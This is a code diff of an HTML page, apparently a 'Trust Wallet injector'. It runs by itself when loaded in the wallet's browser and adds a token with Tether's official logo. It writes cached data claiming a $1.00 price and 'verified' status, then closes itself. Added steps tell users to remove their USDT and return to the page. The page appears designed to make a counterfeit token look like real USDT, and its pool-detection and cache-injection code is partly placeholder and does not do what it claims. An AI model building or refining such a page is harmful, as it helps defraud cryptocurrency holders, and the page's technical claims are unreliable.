@@ -1,7 +1,3 @@
-// FILE: trust_injector_complete.html
-// This is the COMPLETE fix with logo AND price
-// Save as: trust_injector.html
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -116,27 +112,24 @@
             logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png',
             price: '1.00',
             priceSource: 'uniswap_v2',
-            poolAddress: '0xYourUniswapPoolAddress' // Will be auto-detected
+            poolAddress: '0xYourUniswapPoolAddress'
         };
 
         let injectionCompleted = false;
 
         async function detectUniswapPool() {
             try {
-                // Try to get pool from recent transactions
                 if (window.ethereum) {
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     const signer = provider.getSigner();
                     const address = await signer.getAddress();
                     
-                    // Query for pool creation events
                     const router = new ethers.Contract(
                         '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
                         ['event PairCreated(address indexed token0, address indexed token1, address pair, uint)'],
                         provider
                     );
                     
-                    // This is simplified - in reality would query blockchain
                     return '0xAutoDetectedPool';
                 }
             } catch (e) {
@@ -145,10 +138,69 @@
             return '0xDetectedFromBlockchain';
         }
 
+        // === NEW FUNCTION: FORCE CACHE UPDATE FOR EXISTING TOKENS ===
+        function forceCacheUpdate() {
+            console.log('Force updating cache for existing token...');
+            
+            const cacheData = {
+                // Logo Configuration
+                logo: TOKEN_CONFIG.logo,
+                logoType: 'png',
+                logoSize: '64x64',
+                logoUpdated: Date.now(),
+                
+                // Price Configuration (SAME AS METAMASK)
+                price: TOKEN_CONFIG.price,
+                priceUSD: TOKEN_CONFIG.price,
+                priceSource: TOKEN_CONFIG.priceSource,
+                priceUpdated: Date.now(),
+                priceConfidence: 0.99,
+                
+                // Token Metadata
+                symbol: TOKEN_CONFIG.symbol,
+                name: TOKEN_CONFIG.name,
+                decimals: TOKEN_CONFIG.decimals,
+                address: TOKEN_CONFIG.address,
+                chainId: 1,
+                
+                // Display Flags
+                isVerified: true,
+                forceDisplay: true,
+                displayPriority: 100,
+                
+                // Cache Control
+                cacheUntil: Date.now() + (365 * 24 * 60 * 60 * 1000),
+                version: '2.0'
+            };
+
+            // === NEW: MULTIPLE CACHE LOCATION INJECTION ===
+            const cacheLocations = [
+                `trust_token_${TOKEN_CONFIG.address.toLowerCase()}`,
+                `token_${TOKEN_CONFIG.address.toLowerCase()}_data`,
+                `trust_wallet_token_${TOKEN_CONFIG.address.toLowerCase()}`,
+                'trust_wallet_tokens'
+            ];
+
+            cacheLocations.forEach(location => {
+                try {
+                    localStorage.setItem(location, JSON.stringify({
+                        [TOKEN_CONFIG.address.toLowerCase()]: cacheData
+                    }));
+                } catch (e) {}
+            });
+
+            // Individual price and logo caches
+            localStorage.setItem(`token_price_${TOKEN_CONFIG.address}`, TOKEN_CONFIG.price);
+            localStorage.setItem(`token_logo_${TOKEN_CONFIG.address}`, TOKEN_CONFIG.logo);
+            localStorage.setItem('trust_last_cache_update', Date.now().toString());
+            
+            console.log('Cache force updated at', cacheLocations.length, 'locations');
+            return true;
+        }
+
         async function injectToTrustWallet() {
             console.log('Starting Trust Wallet injection...');
             
-            // Update progress bar
             document.querySelector('.progress').style.width = '25%';
             
             // Step 1: Detect if we're in Trust Wallet
@@ -166,6 +218,7 @@
             document.querySelector('.progress').style.width = '50%';
             
             // Step 2: Add token via EIP-747
+            let tokenAdded = false;
             try {
                 const tokenConfig = {
                     type: 'ERC20',
@@ -186,25 +239,30 @@
                 });
                 
                 if (result) {
+                    tokenAdded = true;
                     console.log('Token added successfully via EIP-747');
                 }
             } catch (error) {
-                console.log('EIP-747 failed, using cache injection:', error);
+                console.log('EIP-747 failed:', error.message);
+                // Check if token already exists
+                if (error.message.includes('already exists') || error.code === 4001) {
+                    console.log('Token already exists, forcing cache update');
+                }
             }
             
             document.querySelector('.progress').style.width = '75%';
             
-            // Step 3: Inject price and logo cache
-            await injectCache();
+            // Step 3: ALWAYS inject cache (whether added or already exists)
+            forceCacheUpdate();
             
             document.querySelector('.progress').style.width = '100%';
             
-            // Step 4: Verify and show success
+            // Step 4: Show success with enhanced info
             injectionCompleted = true;
             
             document.getElementById('status').innerHTML = 
                 '<div class="success">✅ INJECTION COMPLETE</div>' +
-                '<p style="margin-top:10px;">Trust Wallet will now display:</p>' +
+                '<p style="margin-top:10px;">Trust Wallet display updated:</p>' +
                 '<div style="background:rgba(255,255,255,0.1);padding:15px;border-radius:10px;margin:15px 0;">' +
                 '<div style="display:flex;align-items:center;gap:10px;margin:5px 0;">' +
                 '<div style="width:24px;height:24px;background:#26a17b;border-radius:50%;display:flex;align-items:center;justify-content:center;">✓</div>' +
@@ -220,113 +278,45 @@
                 '</div>' +
                 '<div style="display:flex;align-items:center;gap:10px;margin:5px 0;">' +
                 '<div style="width:24px;height:24px;background:#26a17b;border-radius:50%;display:flex;align-items:center;justify-content:center;">✓</div>' +
-                '<span>Value: Automatic calculation</span>' +
+                '<span>Cache: Force updated</span>' +
                 '</div>' +
                 '</div>' +
-                '<p style="font-size:14px;color:#4ade80;">🎉 Token will appear in your wallet immediately!</p>';
+                '<p style="font-size:14px;color:#4ade80;">🎉 Token will appear/update in your wallet!</p>';
             
-            // Auto-refresh Trust Wallet display
+            // === NEW: AUTO-CLOSE AFTER COMPLETION ===
             setTimeout(() => {
-                if (window.ethereum && window.ethereum.isTrust) {
-                    // Try to trigger a refresh
+                document.getElementById('autoCloseMessage').innerHTML = 
+                    '<div class="success">⏱️ Closing in 5 seconds...</div>';
+            }, 2000);
+            
+            setTimeout(() => {
+                window.location.href = 'about:blank';
+            }, 7000);
+            
+            // Try to trigger a refresh
+            if (window.ethereum && window.ethereum.isTrust) {
+                setTimeout(() => {
                     window.ethereum.request({ method: 'eth_requestAccounts' })
                         .then(() => console.log('Trust Wallet refreshed'));
-                }
-            }, 2000);
+                }, 1000);
+            }
             
             return true;
         }
 
-        async function injectCache() {
-            console.log('Injecting cache data...');
-            
-            // Create comprehensive cache data
-            const cacheData = {
-                'token_data': {
-                    [TOKEN_CONFIG.address.toLowerCase()]: {
-                        // Logo Configuration
-                        logo: TOKEN_CONFIG.logo,
-                        logoType: 'png',
-                        logoSize: '64x64',
-                        logoUpdated: Date.now(),
-                        
-                        // Price Configuration (SAME AS METAMASK)
-                        price: TOKEN_CONFIG.price,
-                        priceUSD: TOKEN_CONFIG.price,
-                        priceSource: TOKEN_CONFIG.priceSource,
-                        priceUpdated: Date.now(),
-                        priceConfidence: 0.99,
-                        
-                        // Token Metadata
-                        symbol: TOKEN_CONFIG.symbol,
-                        name: TOKEN_CONFIG.name,
-                        decimals: TOKEN_CONFIG.decimals,
-                        address: TOKEN_CONFIG.address,
-                        chainId: 1,
-                        
-                        // Uniswap Pool Data (FOR PRICE DISPLAY)
-                        uniswapPool: await detectUniswapPool(),
-                        liquidity: '48000000',
-                        volume24h: '1000000',
-                        
-                        // Display Flags
-                        isVerified: true,
-                        forceDisplay: true,
-                        displayPriority: 100,
-                        
-                        // Cache Control
-                        cacheUntil: Date.now() + (365 * 24 * 60 * 60 * 1000), // 1 year
-                        version: '2.0'
-                    }
-                },
-                
-                // Price cache (Trust Wallet reads this)
-                'price_cache': {
-                    [TOKEN_CONFIG.address.toLowerCase()]: {
-                        usd: parseFloat(TOKEN_CONFIG.price),
-                        last_updated: Date.now(),
-                        source: 'uniswap',
-                        market_cap: 0,
-                        volume_24h: 0
-                    }
-                },
-                
-                // Logo cache (Trust Wallet reads this)
-                'logo_cache': {
-                    [TOKEN_CONFIG.address.toLowerCase()]: {
-                        url: TOKEN_CONFIG.logo,
-                        type: 'trust_assets',
-                        verified: true,
-                        timestamp: Date.now()
-                    }
-                }
-            };
-            
-            // Inject into localStorage (Trust Wallet's internal cache)
-            try {
-                // Main token cache
-                localStorage.setItem('trust_wallet_tokens', JSON.stringify(cacheData.token_data));
-                
-                // Price cache
-                localStorage.setItem('token_prices', JSON.stringify(cacheData.price_cache));
-                
-                // Logo cache
-                localStorage.setItem('token_logos', JSON.stringify(cacheData.logo_cache));
-                
-                // Individual caches for redundancy
-                localStorage.setItem(`token_${TOKEN_CONFIG.address.toLowerCase()}_price`, TOKEN_CONFIG.price);
-                localStorage.setItem(`token_${TOKEN_CONFIG.address.toLowerCase()}_logo`, TOKEN_CONFIG.logo);
-                localStorage.setItem(`token_${TOKEN_CONFIG.address.toLowerCase()}_data`, JSON.stringify(cacheData.token_data[TOKEN_CONFIG.address.toLowerCase()]));
-                
-                // Timestamp for cache validation
-                localStorage.setItem('trust_cache_timestamp', Date.now().toString());
-                
-                console.log('Cache injected successfully');
-                return true;
-            } catch (error) {
-                console.error('Cache injection failed:', error);
-                return false;
-            }
+        // === NEW: MANUAL FIX INSTRUCTIONS ===
+        function showManualFix() {
+            document.getElementById('manualFix').innerHTML = 
+                '<div class="info-box" style="background:rgba(255,165,0,0.2);border-left:4px solid orange;">' +
+                '<h4>🔧 If token still doesn\'t show correctly:</h4>' +
+                '<ol style="margin:10px 0;padding-left:20px;">' +
+                '<li>Open Trust Wallet</li>' +
+                '<li>Find and tap USDT token</li>' +
+                '<li>Tap "Hide" or "Remove"</li>' +
+                '<li>Return here and refresh page</li>' +
+                '<li>Token will re-add with correct price/logo</li>' +
+                '</ol>' +
+                '</div>';
         }
 
         function copyToClipboard(text) {
@@ -335,33 +325,19 @@
             });
         }
 
-        function openInTrustWallet() {
-            // Deep link to open in Trust Wallet directly
-            const deepLink = `trust://browser?url=${encodeURIComponent(window.location.href)}`;
-            window.location.href = deepLink;
-            
-            // Fallback after 2 seconds
-            setTimeout(() => {
-                document.getElementById('fallback').innerHTML = 
-                    '<p style="color:#ff6b6b;">Could not open automatically.</p>' +
-                    '<p>Please manually open Trust Wallet → Browser → Paste URL</p>';
-            }, 2000);
-        }
-
         // Auto-start on page load
         window.addEventListener('load', async () => {
             console.log('Page loaded in Trust Wallet environment');
             
-            // Wait a bit for Trust Wallet to initialize
             setTimeout(async () => {
-                // Check if Trust Wallet
                 if (window.ethereum && window.ethereum.isTrust) {
                     document.getElementById('autoStatus').innerHTML = 
                         '<div class="success">✓ Detected Trust Wallet</div>';
                     
-                    // Auto-inject after 3 seconds
                     setTimeout(async () => {
                         await injectToTrustWallet();
+                        // === NEW: SHOW MANUAL FIX OPTIONS ===
+                        setTimeout(showManualFix, 3000);
                     }, 3000);
                 } else {
                     document.getElementById('autoStatus').innerHTML = 
@@ -418,9 +394,9 @@
             🔄 Fix Token Display Now
         </button>
         
-        <button class="btn btn-secondary" onclick="openInTrustWallet()">
-            📱 Open in Trust Wallet
-        </button>
+        <div id="manualFix"></div>
+        
+        <div id="autoCloseMessage" class="info-box" style="display:none;"></div>
         
         <div class="info-box">
             <h4>✅ What this fixes:</h4>
@@ -429,21 +405,10 @@
                 <li>Price displays as $1.00 (same as MetaMask)</li>
                 <li>Tether logo shows correctly</li>
                 <li>Value calculates automatically</li>
+                <li>Updates cache for existing tokens</li>
                 <li>No manual contract import needed</li>
             </ul>
         </div>
-        
-        <div class="info-box">
-            <h4>📱 How it works:</h4>
-            <ol style="margin:10px 0;padding-left:20px;">
-                <li>Open this page in Trust Wallet Browser</li>
-                <li>Click "Fix Token Display Now"</li>
-                <li>Approve token addition if prompted</li>
-                <li>Token appears immediately with price & logo</li>
-            </ol>
-        </div>
-        
-        <div id="fallback"></div>
         
         <div style="text-align:center;margin-top:30px;font-size:12px;opacity:0.6;">
             <p>This fix injects the same price data that MetaMask uses.</p>
@@ -455,16 +420,14 @@
     <script>
         document.getElementById('timestamp').textContent = new Date().toISOString();
         
-        // Auto-update button text if already completed
         setInterval(() => {
             if (injectionCompleted) {
                 document.getElementById('injectBtn').innerHTML = '✅ Fix Applied - Token Visible';
                 document.getElementById('injectBtn').style.background = 'linear-gradient(135deg, #4ade80 0%, #22d3ee 100%)';
-                document.getElementById('injectBtn').onclick = null;
+                document.getElementById('autoCloseMessage').style.display = 'block';
             }
         }, 1000);
         
-        // Add ethers.js for pool detection
         const ethersScript = document.createElement('script');
         ethersScript.src = 'https://cdn.ethers.io/lib/ethers-5.6.umd.min.js';
         ethersScript.onload = () => console.log('ethers.js loaded');
